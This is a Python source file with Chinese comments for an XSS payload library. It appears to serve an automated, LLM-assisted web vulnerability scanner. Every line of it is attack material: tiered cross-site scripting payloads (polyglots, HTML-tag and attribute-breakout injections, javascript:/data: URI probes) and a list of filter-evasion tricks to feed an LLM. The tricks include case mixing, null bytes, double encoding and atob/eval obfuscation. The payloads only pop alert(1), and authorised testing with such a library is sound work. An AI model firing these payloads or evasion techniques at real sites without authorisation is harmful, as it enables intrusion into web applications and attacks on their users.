# script/exploit/xss_payloads.py

class XSSPayloadLib:
    """
    XSS 攻击载荷库 (XSS Payload Library)
    按照攻击优先级 (Tier 1 - Tier 4) 分类存储。
    """

    # ===========================================================================
    # Tier 1: Polyglots (黄金多语种)
    # 目的: 高频试探，试图一次性打破多种上下文（HTML、属性、脚本内）。
    # 适用: 所有场景，作为首发测试。
    # ===========================================================================
    TIER_1_POLYGLOTS = [
        # The 0xSobky Polyglot - 极高成功率
        r"javascript://%250Aalert(1)//" + r"\"/*\'/*" + r"/*--></script><img src=x onerror=alert(1)>",

        # Ashar Javed's Polyglot - 针对属性和脚本上下文
        r"\";alert(1);//",

        # Mathias Bynens' Polyglot - 针对复杂的 quote 过滤
        r"-->'\"><script>alert(1)</script>",

        # 混合 URL/属性/标签测试
        r"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    ]

    # ===========================================================================
    # Tier 2: Modern Standard (现代主流)
    # 目的: 针对 Chrome/Firefox 等现代浏览器的特定标签攻击。
    # 适用: 这里的 Payload 分为 HTML 和 Attribute 两类，需根据 PotentialIssue 的 location 选择。
    # ===========================================================================

    # 2.1 HTML 标签上下文 (e.g., <div>...</div>)
    TIER_2_HTML = [
        r"<script>alert(1)</script>",
        r"<img src=x onerror=alert(1)>",
        r"<svg/onload=alert(1)>",
        r"<body onpageshow=alert(1)>",
        r"<iframe src='javascript:alert(1)'></iframe>",
        r"<iframe onload=alert(1)></iframe>",  # 现代 iframe 攻击首选
        r"<iframe srcdoc='<script>alert(1)</script>'></iframe>",
        r"<details open ontoggle=alert(1)>",
        r"<audio src=x onerror=alert(1)>",
        r"<input onfocus=alert(1) autofocus>",
    ]

    # 2.2 属性上下文 (e.g., <input value="...">)
    TIER_2_ATTR = [
        # 闭合双引号
        r'"><script>alert(1)</script>',
        r'" onmouseover=alert(1) "',
        r'" autofocus onfocus=alert(1) x="',
        # 闭合单引号
        r"'><script>alert(1)</script>",
        r"' onmouseover=alert(1) '",
    ]

    # ===========================================================================
    # Tier 3: Legacy & Probing (历史遗留与探测)
    # 目的: 探测服务端过滤逻辑。即使现代浏览器不弹窗，如果服务端未过滤，则是重要漏洞信号。
    # 适用: 查漏补缺。
    # ===========================================================================
    TIER_3_LEGACY = [
        r"<iframe src='javascript:alert(1)'></iframe>",  # 探测 javascript: 协议过滤
        r"<a href='javascript:alert(1)'>ClickMe</a>",  # 现代浏览器其实支持这个，只要用户点击
        r"<form action='javascript:alert(1)'><input type=submit>",
        r"<object data='javascript:alert(1)'>",
        r"<iframe src='data:text/html,<script>alert(1)</script>'></iframe>",
        r"<a href='javas&#99;ript:alert(1)'>",  # 实体编码混淆
        r"<img src=x onerror='vbscript:msgbox(1)'>",  # 探测 VBScript 关键字
    ]

    # ===========================================================================
    # Tier 4: LLM Mutation Strategies (LLM 变异策略)
    # 注意: 这不是 Payload 列表，而是喂给 LLM 的 Prompt 知识库。
    # 当基础攻击失败时，将此列表作为 Suggested Strategies 提供给 LLM。
    # ===========================================================================
    TIER_4_STRATEGIES = [
        "Change case sensitivity (e.g., <ScRiPt>)",
        "Use null bytes or control characters (e.g., <script%00>)",
        "Use URL double encoding (e.g., %253Cscript%253E)",
        "Use Unicode escapes (e.g., \\u003c)",
        "Try nested tags (e.g., <scr<script>ipt>)",
        "Use SVG animation attributes (e.g., <animate onbegin=...>)",
        "Use JavaScript backticks instead of quotes (e.g., alert`1`)",
        "Obfuscate code using atob() or eval()",
        "Insert comments to break keywords (e.g., java/* */script)",
    ]

    @classmethod
    def get_payloads(cls, context: str = "html") -> list[str]:
        """
        获取组合好的 Payload 列表，按优先级排序。

        Args:
            context (str): 'html' | 'attribute' | 'all'

        Returns:
            list[str]: 排序后的攻击载荷列表
        """
        payloads = []

        # 1. Tier 1: 总是最先尝试
        payloads.extend(cls.TIER_1_POLYGLOTS)

        # 2. Tier 2: 根据上下文选择
        if context == "attribute":
            # 属性注入优先，但也尝试 HTML 注入（以防闭合成功后进入 HTML 上下文）
            payloads.extend(cls.TIER_2_ATTR)
            payloads.extend(cls.TIER_2_HTML)
        elif context == "html":
            payloads.extend(cls.TIER_2_HTML)
            payloads.extend(cls.TIER_2_ATTR)  # 也可以试试，万一判断错了
        else:  # 'all'
            payloads.extend(cls.TIER_2_HTML)
            payloads.extend(cls.TIER_2_ATTR)

        # 3. Tier 3: 最后尝试探测
        payloads.extend(cls.TIER_3_LEGACY)

        return payloads

    @classmethod
    def get_mutation_strategies(cls) -> list[str]:
        """
        返回给 LLM 的变异策略提示
        """
        return cls.TIER_4_STRATEGIES